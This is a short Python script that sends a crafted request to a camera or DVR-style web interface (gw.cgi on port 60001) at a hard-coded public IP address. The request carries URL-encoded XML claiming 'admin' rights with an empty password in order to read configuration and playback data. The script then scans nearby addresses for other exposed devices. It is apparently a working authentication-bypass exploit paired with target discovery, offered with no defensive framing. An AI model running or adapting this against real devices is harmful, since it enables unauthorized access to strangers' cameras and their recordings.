import requests
ip = '93.172.132.'

real_ip = '93.172.132.38'

url = '/cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=1581953285673'
x = requests.get('http://' + real_ip + ':60001' + url)
print(x.content.__len__())
print('you entered :', ip)
dict = []
for forth_ip_part in range(211, 212):
    ip_that_i_check = ip + str(forth_ip_part)
    print(ip_that_i_check)
    try:
        r = requests.get('http://' + ip_that_i_check + ':60001')
        ("online" + ip_that_i_check)
    except:
        ("not online" + ip_that_i_check)
    print(r.status_code)
    if (r.status_code == 200):
        dict.append(ip_that_i_check + ':60001')
        dict.append(ip)

print(dict)